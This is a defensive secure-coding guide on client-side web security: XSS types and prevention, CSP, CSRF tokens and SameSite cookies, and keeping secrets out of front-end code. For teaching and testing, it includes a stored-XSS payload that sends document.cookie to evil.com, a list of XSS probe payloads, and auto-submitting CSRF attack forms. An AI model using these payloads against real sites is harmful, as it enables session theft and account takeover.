# Client-Side Security - Detailed Guide

## Overview

Client-side vulnerabilities exploit weaknesses in how applications handle user input and render content in the browser. These attacks can steal credentials, hijack sessions, and compromise user data.

## Cross-Site Scripting (XSS)

### What is XSS?

XSS occurs when an attacker injects malicious scripts into web pages viewed by other users. The victim's browser executes the attacker's code, allowing session theft, credential harvesting, and more.

### Types of XSS

#### 1. Reflected XSS

Attack payload is reflected from the server in the response.

**Example:**
```
https://example.com/search?q=<script>alert(document.cookie)</script>

Server renders: <h1>Results for: <script>alert(document.cookie)</script></h1>
```

#### 2. Stored XSS

Attack payload is stored in the database and displayed to all users.

**Example:**
```
User posts comment: <img src=x onerror="fetch('https://evil.com?c='+document.cookie)">
All users viewing the comment execute the malicious script
```

#### 3. DOM-based XSS

Attack payload executes entirely in the client-side JavaScript.

**Example:**
```javascript
// Vulnerable code
const name = location.hash.slice(1);
document.getElementById('welcome').innerHTML = 'Hello ' + name;

// Attack: https://example.com#<img src=x onerror=alert(1)>
```

### Input Sources Requiring Protection

**Direct Inputs:**
- Form fields (text, textarea, rich text editors)
- Search queries
- File names during upload
- Comment sections
- User profiles (name, bio, etc.)

**Indirect Inputs:**
- URL parameters (`?id=123&sort=name`)
- URL fragments (`#section`)
- HTTP headers (Referer, User-Agent if displayed)
- Data from third-party APIs
- WebSocket messages
- postMessage data from iframes
- LocalStorage/SessionStorage values

**Often Overlooked:**
- Error messages reflecting user input
- PDF/document generators accepting HTML
- Email templates with user data
- Admin panel log viewers
- JSON responses rendered as HTML
- SVG file uploads (can contain JavaScript)
- Markdown rendering (if allowing raw HTML)

### XSS Prevention Strategies

#### 1. Output Encoding (Context-Specific)

**HTML Context:**
```php
// PHP
echo htmlspecialchars($userInput, ENT_QUOTES, 'UTF-8');

// JavaScript (React/JSX - automatic)
<div>{userInput}</div>

// Vue.js (automatic)
<div>{{ userInput }}</div>
```

**JavaScript Context:**
```javascript
// Encode for JavaScript strings
const safe = JSON.stringify(userInput);
```

**URL Context:**
```php
// Encode for URL parameters
$url = "https://example.com/search?q=" . urlencode($userInput);
```

**CSS Context:**
```php
// Escape for CSS (avoid if possible)
$safe = preg_replace('/[^a-z0-9-_]/i', '', $userInput);
```

#### 2. Content Security Policy (CSP)

**Strict CSP Header:**
```
Content-Security-Policy:
  default-src 'self';
  script-src 'self';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  font-src 'self';
  connect-src 'self' https://api.yourdomain.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
  upgrade-insecure-requests;
```

**Using Nonces for Inline Scripts:**
```php
// Generate nonce
$nonce = base64_encode(random_bytes(16));

// Header
header("Content-Security-Policy: script-src 'self' 'nonce-$nonce'");

// Inline script
echo "<script nonce='$nonce'>console.log('Safe');</script>";
```

**CSP Reporting:**
```
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
```

#### 3. Input Sanitization

**For Rich Text (HTML):**
```javascript
// Use DOMPurify
import DOMPurify from 'dompurify';

const clean = DOMPurify.sanitize(dirtyHTML, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],
  ALLOWED_ATTR: ['href'],
});
```

**For Markdown:**
```javascript
// Use marked with DOMPurify
import marked from 'marked';
import DOMPurify from 'dompurify';

const html = marked(markdown);
const clean = DOMPurify.sanitize(html);
```

#### 4. Framework-Specific Protection

**React:**
```jsx
// Safe by default (automatic escaping)
<div>{userInput}</div>

// DANGEROUS - avoid dangerouslySetInnerHTML
<div dangerouslySetInnerHTML={{__html: userInput}} />

// If you must use it, sanitize first
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{__html: DOMPurify.sanitize(userInput)}} />
```

**Vue.js:**
```vue
<!-- Safe by default -->
<div>{{ userInput }}</div>

<!-- DANGEROUS - avoid v-html -->
<div v-html="userInput"></div>

<!-- If you must, sanitize first -->
<div v-html="sanitize(userInput)"></div>
```

### Testing for XSS

**Manual Test Payloads:**
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<video><source onerror="alert(1)">
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<body onload=alert(1)>
<marquee onstart=alert(1)>
```

**Context-Specific Payloads:**
```javascript
// In attribute context
" onload="alert(1)

// In JavaScript string context
'; alert(1); //

// In URL context
javascript:alert(1)
```

---

## Cross-Site Request Forgery (CSRF)

### What is CSRF?

CSRF tricks authenticated users into performing unwanted actions on a web application where they're currently authenticated.

**Example Attack:**
```html
<!-- Attacker's website -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="amount" value="10000">
  <input type="hidden" name="to" value="attacker">
</form>
<script>document.forms[0].submit();</script>

<!-- If user is logged into bank.com, transfer executes -->
```

### Endpoints Requiring CSRF Protection

**State-Changing Actions:**
- All POST, PUT, PATCH, DELETE requests
- Password changes
- Email changes
- Account deletions
- Payment/transaction endpoints
- Settings modifications
- Two-factor authentication setup/disable

**Pre-Authentication Actions:**
- Login endpoints (prevent login CSRF)
- Signup endpoints
- Password reset requests
- Email/phone verification
- OAuth callback handlers

### CSRF Protection Mechanisms

#### 1. CSRF Tokens (Synchronizer Token Pattern)

**Generate Token:**
```php
// Generate cryptographically random token
$csrfToken = bin2hex(random_bytes(32));

// Store in session
$_SESSION['csrf_token'] = $csrfToken;

// Include in form
echo '<input type="hidden" name="csrf_token" value="' . $csrfToken . '">';
```

**Validate Token:**
```php
// Check token on submission
if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    die('CSRF token validation failed');
}

// Regenerate after use (optional, for sensitive operations)
unset($_SESSION['csrf_token']);
```

**For AJAX Requests:**
```javascript
// Add token to all AJAX requests
fetch('/api/data', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': document.querySelector('meta[name="csrf-token"]').content
  },
  body: JSON.stringify(data)
});
```

#### 2. SameSite Cookies

```
Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
```

**SameSite Options:**
- `Strict`: Cookie never sent on cross-site requests (best security)
- `Lax`: Cookie sent on top-level navigation (good balance)
- `None`: Cookie sent everywhere (requires Secure flag)

**Example:**
```php
setcookie('session', $sessionId, [
    'expires' => time() + 3600,
    'path' => '/',
    'domain' => 'example.com',
    'secure' => true,      // HTTPS only
    'httponly' => true,    // Not accessible via JavaScript
    'samesite' => 'Strict' // CSRF protection
]);
```

#### 3. Double Submit Cookie Pattern

**Set Token in Cookie and Form:**
```php
// Generate token
$csrfToken = bin2hex(random_bytes(32));

// Set in cookie
setcookie('csrf_token', $csrfToken, ['samesite' => 'Strict', 'secure' => true]);

// Include in form/header
echo '<input type="hidden" name="csrf_token" value="' . $csrfToken . '">';
```

**Validate They Match:**
```php
if ($_COOKIE['csrf_token'] !== $_POST['csrf_token']) {
    die('CSRF validation failed');
}
```

#### 4. Custom Headers for APIs

**Require Custom Header:**
```javascript
// Client sends custom header
fetch('/api/data', {
  method: 'POST',
  headers: {
    'X-Requested-With': 'XMLHttpRequest',
    'X-Custom-Header': 'api-request'
  },
  body: JSON.stringify(data)
});
```

**Server Validates:**
```php
if (!isset($_SERVER['HTTP_X_REQUESTED_WITH']) ||
    $_SERVER['HTTP_X_REQUESTED_WITH'] !== 'XMLHttpRequest') {
    die('Invalid request');
}
```

### Common CSRF Mistakes

#### 1. Token Presence Check

**WRONG:**
```php
if (isset($_POST['csrf_token']) && $_POST['csrf_token'] === $_SESSION['csrf_token']) {
    // Process request
}
// NO else block - accepts requests without token!
```

**CORRECT:**
```php
if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    die('CSRF token required');
}
// Process request
```

#### 2. GET Requests with Side Effects

**WRONG:**
```php
// DELETE via GET - vulnerable to CSRF via image tags
Route::get('/users/{id}/delete', [UserController::class, 'delete']);
```

**CORRECT:**
```php
// Use proper HTTP method
Route::delete('/users/{id}', [UserController::class, 'delete']);
```

#### 3. Token in URL

**WRONG:**
```html
<a href="/delete?id=5&csrf_token=abc123">Delete</a>
<!-- Token can leak via Referer header -->
```

**CORRECT:**
```html
<form action="/delete" method="POST">
  <input type="hidden" name="id" value="5">
  <input type="hidden" name="csrf_token" value="abc123">
  <button type="submit">Delete</button>
</form>
```

### Testing for CSRF

**Manual Test:**
```html
<!-- Create attack page -->
<form action="https://target.com/api/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="submit" value="Click me!">
</form>
<script>document.forms[0].submit();</script>

<!-- Host on different domain, visit while logged into target -->
```

**Automated Test:**
```bash
# Remove CSRF token and retry request
curl -X POST https://target.com/api/change-email \
  -H "Cookie: session=valid_session" \
  -d "email=attacker@evil.com"

# Should be rejected
```

---

## Secret Keys and Sensitive Data Exposure

### Never Expose in Client-Side Code

**API Keys and Secrets:**
- Third-party API keys (Stripe secret, OpenAI, AWS)
- Database connection strings
- JWT signing secrets
- Encryption keys
- OAuth client secrets
- Internal service credentials

**Sensitive User Data:**
- Full credit card numbers
- Social Security Numbers
- Passwords (even hashed)
- Security questions/answers
- Full phone numbers (mask: **_-_**-1234)

**Infrastructure Details:**
- Internal IP addresses
- Database schemas
- Debug information
- Stack traces in production
- Server software versions

### Where Secrets Hide

**Check These Locations:**
- JavaScript bundle files
- Source maps (`.map` files)
- HTML comments
- Hidden form fields
- Data attributes (`data-api-key="..."`)
- LocalStorage/SessionStorage
- Initial state in SSR apps (`window.__INITIAL_STATE__`)
- Environment variables exposed via build tools

**Build Tool Exposure:**
```javascript
// WRONG - Exposed to client
// .env
REACT_APP_SECRET_KEY=abc123
NEXT_PUBLIC_SECRET=xyz789

// CORRECT - Server-side only
// .env
SECRET_KEY=abc123
DATABASE_URL=postgres://...

// .env.local (for Next.js public vars)
NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY=pk_test_...  // OK to expose
```

### Secure Secret Management

#### 1. Environment Variables

```bash
# .env file
SECRET_KEY=abc123
DATABASE_URL=postgres://...
STRIPE_SECRET_KEY=sk_live_...

# .gitignore
.env
.env.local
.env.*.local
```

#### 2. Server-Side Only Operations

```javascript
// WRONG - Client-side API call with secret
const openai = new OpenAI({ apiKey: 'sk-proj-...' });
const response = await openai.chat.completions.create({...});

// CORRECT - Server-side API route
// pages/api/chat.js
export default async function handler(req, res) {
  const openai = new OpenAI({ apiKey: process.env.OPENAI_API_KEY });
  const response = await openai.chat.completions.create({...});
  res.json(response);
}

// Client calls the server route
fetch('/api/chat', {
  method: 'POST',
  body: JSON.stringify({ message: 'Hello' })
});
```

#### 3. Check Compiled Output

```bash
# Check production build for secrets
grep -r "sk_live_" build/
grep -r "SECRET" build/static/js/

# Check source maps
grep -r "DATABASE_URL" build/**/*.map
```

### Additional Security Headers

```
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Referrer-Policy: strict-origin-when-cross-origin
```

## Summary

Client-side security requires defense in depth:
1. **Encode all output** based on context
2. **Implement CSP** to limit script execution
3. **Protect against CSRF** with tokens and SameSite cookies
4. **Never expose secrets** in client-side code
5. **Test thoroughly** with real attack payloads
